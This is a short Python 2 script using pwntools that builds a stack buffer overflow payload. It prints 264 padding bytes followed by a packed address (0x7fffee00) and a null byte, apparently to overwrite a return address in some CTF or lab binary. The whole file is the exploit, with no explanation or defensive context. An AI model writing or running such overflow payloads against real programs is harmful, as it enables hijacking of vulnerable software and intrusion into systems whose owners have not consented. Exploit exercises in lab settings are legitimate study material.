import struct
from pwn import *

padding = '@' * 264
payload = struct.pack("I", 0x7fffee00)
print padding + payload + "\x00"